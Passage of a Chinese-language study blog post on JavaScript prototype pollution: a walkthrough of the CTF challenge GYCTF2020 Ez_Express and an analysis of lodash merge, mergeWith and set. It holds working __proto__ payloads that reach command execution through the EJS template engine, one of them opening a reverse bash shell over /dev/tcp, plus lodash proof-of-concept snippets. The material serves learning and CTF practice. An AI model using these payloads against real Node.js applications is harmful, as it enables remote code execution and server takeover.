+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function merge(target, source) &#123;</span><br><span class="line">    console.log(source)</span><br><span class="line">    console.log(target)</span><br><span class="line">    for (let key in source) &#123;</span><br><span class="line">      </span><br><span class="line">        if (key in source &amp;&amp; key in target) &#123;</span><br><span class="line">            console.log(key)</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            console.log(key)</span><br><span class="line">            </span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">let o1 = &#123;&#125;</span><br><span class="line">let o2 = JSON.parse(&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;)</span><br><span class="line">merge(o1, o2)</span><br><span class="line">console.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line">console.log(o3.b)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>运行结果：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230707174625210.png"
+                      alt="image-20230707174625210"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230707175128102.png"
+                      alt="image-20230707175128102"
+                ></p>
+<p>重点在这</p>
+<p>如果键值在这两个里面都存在就会进入这个if判断</p>
+<p>我这里打了输出</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230707175530444.png"
+                      alt="image-20230707175530444"
+                ></p>
+<p>那么再去执行就变成了merge([Object: null prototype] {},{b,2})</p>
+<p>那么再次执行merge函数</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">target[b] = source[b]=2</span><br></pre></td></tr></table></figure></div>
+
+<p>上面我们可以看到target&#x3D;[Object: null prototype] {}</p>
+<p>那么就等于再object中插入了一个属性b值为2</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line">console.log(o3.b)</span><br></pre></td></tr></table></figure></div>
+
+<p>那我们这里o3在自身找不到属性b的值就会沿着原型链查找，到object会找到b属性的值输出</p>
+<p>那么通过上面分析我们可与得到merge存在原型链污染漏洞</p>
+<p>至于为什么我们修改代码可与污染成功</p>
+<p>这是因为，JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p>
+<h6 id="例题：-GYCTF2020-Ez-Express"><a href="#例题：-GYCTF2020-Ez-Express" class="headerlink" title="例题：[GYCTF2020]Ez_Express"></a>例题：[GYCTF2020]Ez_Express</h6><p>访问<a href="http://www.zip下载源码：">www.zip下载源码：</a></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var router = express.Router();</span><br><span class="line">const isObject = obj =&gt; obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object;</span><br><span class="line">const merge = (a, b) =&gt; &#123;</span><br><span class="line">  for (var attr in b) &#123;</span><br><span class="line">    if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return a</span><br><span class="line">&#125;</span><br><span class="line">const clone = (a) =&gt; &#123;</span><br><span class="line">  return merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>login.js中存在merg函数</p>
+<p>看一下登录页面</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230708110353592.png"
+                      alt="image-20230708110353592"
+                ></p>
+<p>点击登录</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230708110408662.png"
+                      alt="image-20230708110408662"
+                ></p>
+<p>点击注册</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230708110422468.png"
+                      alt="image-20230708110422468"
+                ></p>
+<p>回到源码</p>
+<p>继续分析</p>
+<p>看一下login和register的代码</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">router.post(&#x27;/login&#x27;, function (req, res) &#123;</span><br><span class="line">  if(req.body.Submit==&quot;register&quot;)&#123;</span><br><span class="line">   if(safeKeyword(req.body.userid))&#123;</span><br><span class="line">    res.end(&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;) </span><br><span class="line">   &#125;</span><br><span class="line">    req.session.user=&#123;</span><br><span class="line">      &#x27;user&#x27;:req.body.userid.toUpperCase(),</span><br><span class="line">      &#x27;passwd&#x27;: req.body.pwd,</span><br><span class="line">      &#x27;isLogin&#x27;:false</span><br><span class="line">    &#125;</span><br><span class="line">    res.redirect(&#x27;/&#x27;); </span><br><span class="line">  &#125;</span><br><span class="line">  else if(req.body.Submit==&quot;login&quot;)&#123;</span><br><span class="line">    if(!req.session.user)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125;</span><br><span class="line">    if(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;</span><br><span class="line">      req.session.user.isLogin=true;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">      res.end(&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  res.redirect(&#x27;/&#x27;); ;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>
+
+<p>先看注册safeKeyword进行检查</p>
+<p>看一下safeKeyword函数</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function safeKeyword(keyword) &#123;</span><br><span class="line">  if(keyword.match(/(admin)/is)) &#123;</span><br><span class="line">      return keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return undefined</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>如果匹配到admin，会输出弹窗</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">res.end(&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;) </span><br></pre></td></tr></table></figure></div>
+
+<p>没有匹配到则会正常注册登录</p>
+<p>看一下login</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!req.session.user)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125;</span><br><span class="line">   if(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;</span><br><span class="line">     req.session.user.isLogin=true;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>就是要求账号时注册过的</p>
+<p>但是题目上面让我们注册admin账号</p>
+<p>继续回到register</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">req.session.user=&#123;</span><br><span class="line">  &#x27;user&#x27;:req.body.userid.toUpperCase(),</span><br><span class="line">  &#x27;passwd&#x27;: req.body.pwd,</span><br><span class="line">  &#x27;isLogin&#x27;:false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>当我们注册成功后，会将信息写入session</p>
+<p>然后用户名会经过toUpperCase()函数处理</p>
+<p><code>toUpperCase()</code> 是 JavaScript 字符串对象的一个内置方法，用于将字符串中的所有字符转换为大写形式。它不会改变原始字符串，而是返回一个新的字符串</p>
+<p>但是<code>toUpperCase</code>函数会把某些特殊的字符解析为相应的字母，例如<code>&quot;ı&quot;.toUpperCase() == &#39;I&#39;，&quot;ſ&quot;.toUpperCase() == &#39;S&#39;</code>，</p>
+<p>那么我们就可以通过这个小的函数漏洞去进行绕过注册的限制，我们直接注册admın，那么经过函数处理就会变成admin</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230708113158574.png"
+                      alt="image-20230708113158574"
+                ></p>
+<p>成功登录告诉了我们flag的位置</p>
+<p>有一个提交框，提交后会跳到action路由</p>
+<p>代码分析一下</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">router.post(&#x27;/action&#x27;, function (req, res) &#123;</span><br><span class="line">  if(req.session.user.user!=&quot;ADMIN&quot;)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  res.end(&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;);  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>
+
+<p>代码很好分析</p>
+<p>就是先判断是不是admin用户，如果不是就会弹出admin is asked</p>
+<p>如果是则会执行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">req.session.user.data = clone(req.body);</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">const clone = (a) =&gt; &#123;</span><br><span class="line">  return merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>clone会调用merge函数</p>
+<p>那么这里我们就可以进行原型链污染</p>
+<p>但是现在的问题是我们要污染什么，污染后能干什么</p>
+<p>继续分析代码上面的info路由</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">router.get(&#x27;/info&#x27;, function (req, res) &#123;</span><br><span class="line">  res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>
+
+<p>res.render是 Express.js 框架中用于渲染视图模板的方法。它用于将动态生成的数据和视图模板结合起来，生成最终的 HTML 响应并发送给客户端。我们可以看到这里是将res的outputFunctionName渲染到index，而且这里的outputFunctionName是未定义的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230708115931820.png"
+                      alt="image-20230708115931820"
+                ></p>
+<p>那这里思路就很明显了，我们可以原型链污染给outputFunctionName赋上我们想要执行的命令</p>
+<p>然后通过render进行渲染，然后进行ssti，执行命令获取flag</p>
+<p>抓包看一下</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230708121733690.png"
+                      alt="image-20230708121733690"
+                ></p>
+<p>paylaod：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;lua&quot;:&quot;a&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>或者直接</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>先访问action路由进行原型链污染</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230708121944730.png"
+                      alt="image-20230708121944730"
+                ></p>
+<p>然后访问info进行ssti，命令执行</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230708122013208.png"
+                      alt="image-20230708122013208"
+                ></p>
+<p>然后看其他师傅的文章说还有一种非预期解ejsrce，这里直接贴paylaod了，后门有机会在学习</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230708122645960.png"
+                      alt="image-20230708122645960"
+                ></p>
+<p>这里使用了ejs这个模板引擎</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const path = require(&#x27;path&#x27;);</span><br><span class="line"></span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">app.listen(3000, () =&gt; &#123;</span><br><span class="line">    console.log(&#x27;3000端口&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">//设置ejs:</span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;); //设置模板引擎为ejs</span><br><span class="line">app.set(&#x27;views&#x27;, [`$&#123;path.join(__dirname,&#x27;moban&#x27;)&#125;`, `$&#123;path.join(__dirname,&#x27;views&#x27;)&#125;`]); //设置模板文件的存放位置</span><br><span class="line">app.engine(&#x27;html&#x27;, require(&#x27;ejs&#x27;).__express); //将html文件作为ejs模板文件来解析</span><br></pre></td></tr></table></figure></div>
+
+<p>这个模板引擎本身是存在原形污染的，可以直接进行rce，且有大把现成的exp….</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/监听端口 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>先访问&#x2F;action进行原型链污染，再访问&#x2F;info进行模板渲染，实现RCE</p>
+<p>接着post访问api.js就可以反弹shell了</p>
+<h5 id="Lodash-模块原型链污染"><a href="#Lodash-模块原型链污染" class="headerlink" title="Lodash 模块原型链污染"></a>Lodash 模块原型链污染</h5><p>这里是跟着<a class="link"   href="https://xz.aliyun.com/t/12053#toc-5%E5%A4%8D%E7%8E%B0%E7%9A%84%EF%BC%8C%E8%BF%99%E4%B8%AA%E5%9C%B0%E6%96%B9%E6%B6%89%E5%8F%8A%E4%BA%86%E5%87%A0%E4%B8%AAcve" >https://xz.aliyun.com/t/12053#toc-5复现的，这个地方涉及了几个cve <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>这里就简单分析一下lodash的几个简单的方法，后续有机会了在学习。</p>
+<h6 id="lodash-merge-方法造成的原型链污染"><a href="#lodash-merge-方法造成的原型链污染" class="headerlink" title="lodash.merge 方法造成的原型链污染"></a>lodash.merge 方法造成的原型链污染</h6><p>lodash.merge作为loadsh中的对象合并插件，可以递归合并sources来源对象自身和继承的可枚举属性到object目标对象，以创建父映射对象</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">merge(object, sources)</span><br></pre></td></tr></table></figure></div>
+
+<p>这个和我们上面分析的merge是一样的我们直接看源码分析了，</p>
+<ul>
+<li>node_modules&#x2F;lodash&#x2F;merge.js</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230709162451992.png"
+                      alt="image-20230709162451992"
+                ></p>
+<p>这是lodash库中merge方法的定义</p>
+<p>这里直接调用了baseMerge方法，直接跟进</p>
+<ul>
+<li><p>node_modules&#x2F;lodash&#x2F;_baseMerge.js</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230709162549818.png"
+                      alt="image-20230709162549818"
+                ></p>
+</li>
+</ul>
+<p>通过源码我们可以看到在baseFor里面对srcValue有一个筛选，这里会判断他是不是一个对象，所有如果我们要想进入到baseMerage方法，那就要求我们的Merge是一个object</p>
+<p>继续跟进</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230709162809087.png"
+                      alt="image-20230709162809087"
+                ></p>
+<p>到这我们进入了baseMergeDeep方法</p>
+<p>这里将我们上一步传入的srcValue也就是我们merge的对象放进了assignMergeValue方法</p>
+<p>继续跟进：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230709163008187.png"
+                      alt="image-20230709163008187"
+                ></p>
+<p>这里对对象的值和对象键名进行了一个筛查，最终进入了baseAssignValue</p>
+<p>跟进</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230709163153187.png"
+                      alt="image-20230709163153187"
+                ></p>
+<p>可以看到这里对我们的key做了判断，但是我们要进入到object[key]&#x3D;value才能进行原型链污染操作</p>
+<p>所有这里我们要想办法绕过</p>
+<p>POC：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">prefixPayload = &#123; nickname: &quot;Will1am&quot; &#125;;</span><br><span class="line">payload：&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;role&quot;: &quot;admin&quot;&#125;&#125;&#125;</span><br><span class="line">_.merge(prefixPayload, payload);</span><br></pre></td></tr></table></figure></div>
+
+<p>最终进入 <code>object[key] = value</code> 的赋值操作。</p>
+<p>也就是object[prototype] &#x3D; {“role”: “admin”}</p>
+<p>这样就给原型对象赋值了一个名为role，值为admin的属性</p>
+<p>POC:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var lodash= require(&#x27;lodash&#x27;);</span><br><span class="line">var payload = &#x27;&#123;&quot;__proto__&quot;:&#123;&quot;polluted&quot;:&quot;yes&quot;&#125;&#125;&#x27;;</span><br><span class="line"></span><br><span class="line">var a = &#123;&#125;;</span><br><span class="line">console.log(&quot;Before polluted: &quot; + a.polluted);</span><br><span class="line">lodash.merge(&#123;&#125;, JSON.parse(payload));</span><br><span class="line">console.log(&quot;After polluted: &quot; + a.polluted);</span><br></pre></td></tr></table></figure></div>
+
+<h6 id="lodash-mergeWith-方法-CVE-2018-16487"><a href="#lodash-mergeWith-方法-CVE-2018-16487" class="headerlink" title="lodash.mergeWith 方法 CVE-2018-16487"></a>lodash.mergeWith 方法 CVE-2018-16487</h6><p>这个方法与merge方法不同的是mergeWith还会接受一个参数customizer，如果customizer返回undefined将由合并方法代替</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230710092753220.png"
+                      alt="image-20230710092753220"
+                ></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">object：目标对象</span><br><span class="line">sources：来源对象</span><br><span class="line">srcindex：源对象（source）的索引位置</span><br><span class="line">customizer：这个函数定制合并值</span><br></pre></td></tr></table></figure></div>
+
+<p>这里以一个小的例子来看：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var mergeWith = createAssigner(function(object, source, srcIndex, customizer) &#123;</span><br><span class="line">  baseMerge(object, source, srcIndex, customizer);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">var obj1 = &#123; a: 1 &#125;;</span><br><span class="line">var obj2 = &#123; b: 2 &#125;;</span><br><span class="line">var obj3 = &#123; c: 3 &#125;;</span><br><span class="line"></span><br><span class="line">var mergedObject = mergeWith(&#123;&#125;, obj1, obj2, obj3);</span><br><span class="line"></span><br><span class="line">console.log(mergedObject); // 输出: &#123; a: 1, b: 2, c: 3 &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>这里多出来的参数不好影响我们原型链的利用</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var lodash= require(&#x27;lodash&#x27;);</span><br><span class="line">var payload = &#x27;&#123;&quot;__proto__&quot;:&#123;&quot;polluted&quot;:&quot;yes&quot;&#125;&#125;&#x27;;</span><br><span class="line"></span><br><span class="line">var a = &#123;&#125;;</span><br><span class="line">console.log(&quot;Before polluted: &quot; + a.polluted);</span><br><span class="line">lodash.merge(&#123;&#125;, JSON.parse(payload));</span><br><span class="line">console.log(&quot;After polluted: &quot; + a.polluted);</span><br></pre></td></tr></table></figure></div>
+
+<h6 id="lodash-set-方法造成的原型链污染"><a href="#lodash-set-方法造成的原型链污染" class="headerlink" title="lodash.set 方法造成的原型链污染"></a>lodash.set 方法造成的原型链污染</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">set(object, path, value)</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>object</code>：要设置值的对象。</li>
+<li><code>path</code>：表示属性路径的字符串，使用<code>.</code>作为层级分隔符。</li>
+<li><code>value</code>：要设置的值。</li>
+</ul>
+<p>函数将根据路径遍历对象的属性，并将最终的值设置在路径的末端。如果路径中的某些属性不存在，则会创建缺少的属性。</p>
+<p>例子：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function set(object, path, value) &#123;</span><br><span class="line">  if (!object || typeof object !== &#x27;object&#x27;) &#123;</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  const keys = path.split(&#x27;.&#x27;);</span><br><span class="line">  let currentObj = object;</span><br><span class="line"></span><br><span class="line">  for (let i = 0; i &lt; keys.length - 1; i++) &#123;</span><br><span class="line">    const key = keys[i];</span><br><span class="line"></span><br><span class="line">    if (!currentObj.hasOwnProperty(key) || typeof currentObj[key] !== &#x27;object&#x27;) &#123;</span><br><span class="line">      currentObj[key] = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    currentObj = currentObj[key];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  currentObj[keys[keys.length - 1]] = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const obj = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">set(obj, &#x27;foo.bar.baz&#x27;, 42);</span><br><span class="line"></span><br><span class="line">console.log(obj);  // 输出: &#123; foo: &#123; bar: &#123; baz: 42 &#125; &#125; &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230710094115600.png"
+                      alt="image-20230710094115600"
+                ></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var object = &#123; &#x27;a&#x27;: [&#123; &#x27;b&#x27;: &#123; &#x27;c&#x27;: 3 &#125; &#125;] &#125;;</span><br><span class="line"> _.set(object, &#x27;a[0].b.c&#x27;, 4);</span><br><span class="line">console.log(object.a[0].b.c);</span><br><span class="line">// =&gt; 4 </span><br><span class="line">_.set(object, [&#x27;x&#x27;, &#x27;0&#x27;, &#x27;y&#x27;, &#x27;z&#x27;], 5);</span><br><span class="line">console.log(object.x[0].y.z);</span><br><span class="line">// =&gt; 5</span><br></pre></td></tr></table></figure></div>
+
+<p>分析源码：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230710094300015.png"
+                      alt="image-20230710094300015"
+                ></p>
+<p>这里对object进行了一个判断非空则调用baseSet方法</p>
+<p>baseset接受三个参数就是我们上面传进来的修改对象，路径，值</p>
+<p>跟进baseset方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230710094443013.png"
+                      alt="image-20230710094443013"
+                ></p>
+<p>这里先对object进行了判读。判断其是否为对象</p>
+<p>然后进入castPath方法</p>
+<p>跟进</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230710094806832.png"
+                      alt="image-20230710094806832"
+                ></p>
+<p>这里接受两个参数object和value</p>
+<p>首先会对values判断是否为空</p>
+<p>然后判断给定的值 <code>value</code> 是否是一个对象 <code>object</code> 的键（key），如果是，则返回一个包含该键的数组；如果不是，则会调用stringToPath方法，这里很明显我们调用的不是一个数组</p>
+<p>继续跟进</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230710095240099.png"
+                      alt="image-20230710095240099"
+                ></p>
+<ul>
+<li><code>memoizeCapped</code> 是一个函数，它用于创建一个带有缓存功能的函数。这里使用 <code>memoizeCapped</code> 来创建了一个具有缓存功能的 <code>stringToPath</code> 函数。</li>
+<li><code>stringToPath</code> 函数接受一个字符串参数 <code>string</code>，表示属性路径。</li>
+<li><code>result</code> 是一个数组，用于存储转换后的路径。</li>
+<li>如果字符串的第一个字符的 ASCII 值等于 46（代表字符 “.”），则将空字符串 <code>&#39;&#39;</code> 添加到 <code>result</code> 数组中。这是为了处理属性路径以 “.” 开头的情况。</li>
+<li><code>string.replace(rePropName, function(match, number, quote, subString) &#123; ... &#125;)</code> 使用正则表达式 <code>rePropName</code> 对字符串进行匹配和替换操作。</li>
+<li>在每次匹配时，回调函数会被调用。<code>match</code> 表示匹配到的子字符串，<code>number</code> 表示匹配到的数字字符串，<code>quote</code> 表示匹配到的引号，<code>subString</code> 表示匹配到的子字符串（去除引号的部分）。</li>
+<li>在回调函数中，根据情况将匹配到的值加入到 <code>result</code> 数组中。如果 <code>quote</code> 存在，说明匹配到的是带引号的子字符串，需要去除转义字符后加入 <code>result</code> 数组；否则，将 <code>number</code> 或者 <code>match</code> 加入 <code>result</code> 数组。</li>
+<li>最后，返回 <code>result</code> 数组作为路径数组。</li>
+</ul>
+<p>整个 <code>stringToPath</code> 函数的作用是将字符串表示的属性路径转换为路径数组，每个元素表示路径的一部分。例如，对于属性路径字符串 <code>&#39;a.b[0].c&#39;</code>，转换后的路径数组为 <code>[&#39;a&#39;, &#39;b&#39;, &#39;0&#39;, &#39;c&#39;]</code>。</p>
+<p>那么到这里这个方法就结束了，可以这里对传入的参数并没有进行过滤</p>
+<p>那我就可以对他进行原型链污染</p>
+<p>这里是贴的大佬的POC：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var lodash= require(&#x27;lodash&#x27;);</span><br><span class="line"></span><br><span class="line">var object_1 = &#123; &#x27;a&#x27;: [&#123; &#x27;b&#x27;: &#123; &#x27;c&#x27;: 3 &#125; &#125;] &#125;;</span><br><span class="line">var object_2 = &#123;&#125;</span><br><span class="line"></span><br><span class="line">console.log(object_1.whoami);</span><br><span class="line">//lodash.set(object_2, &#x27;object_2[&quot;__proto__&quot;][&quot;whoami&quot;]&#x27;, &#x27;Vulnerable&#x27;);</span><br><span class="line">lodash.set(object_2, &#x27;__proto__.[&quot;whoami&quot;]&#x27;, &#x27;Vulnerable&#x27;);</span><br><span class="line">console.log(object_1.whoami);</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230710095731665.png"
+                      alt="image-20230710095731665"
+                ></p>
+<p>可以看到这里已经污染成功了</p>
+<h6 id="lodash-setWith-方法造成的原型链污染"><a href="#lodash-setWith-方法造成的原型链污染" class="headerlink" title="lodash.setWith 方法造成的原型链污染"></a>lodash.setWith 方法造成的原型链污染</h6><p>这里类似与上面的set方法，其实这里set和setwith与merge和mergewith的关系是相同的</p>
+<p>这里也多了一个customizer参数</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
